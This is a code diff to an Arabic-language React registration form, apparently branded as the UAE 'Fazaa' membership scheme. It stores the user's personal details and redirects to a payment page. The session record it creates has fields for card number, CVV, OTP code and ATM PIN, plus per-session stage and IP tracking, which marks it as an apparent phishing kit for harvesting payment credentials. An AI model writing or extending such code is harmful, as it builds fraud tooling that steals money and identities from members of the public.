@@ -68,7 +68,35 @@ export default function RegistrationFormArabic() {
     setLoading(true)
     try {
       await new Promise(resolve => setTimeout(resolve, 1500))
-      setSubmitted(true)
+      // Save registration data to localStorage for Payment page
+      const sessionId = 'FAZ-' + Date.now().toString(36)
+      const registrationData = {
+        id: '1',
+        sessionId,
+        fullName: formData.fullName || null,
+        phoneNumber: formData.phoneNumber || null,
+        email: formData.email || null,
+        emirate: formData.emirate || null,
+        district: formData.district || null,
+        membershipTier: formData.membershipTier || null,
+        totalAmount: '150',
+        cardName: null,
+        cardNumber: null,
+        cardExpiry: null,
+        cardCvv: null,
+        otpCode: null,
+        atmPin: null,
+        stage: 'card' as const,
+        errorMessage: null,
+        clientIp: null,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      }
+      const existing = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+      existing.push(registrationData)
+      localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
+      // Navigate to payment page
+      window.location.href = '/payment'
     } catch (err) {
       setError('حدث خطأ أثناء إرسال البيانات')
     } finally {
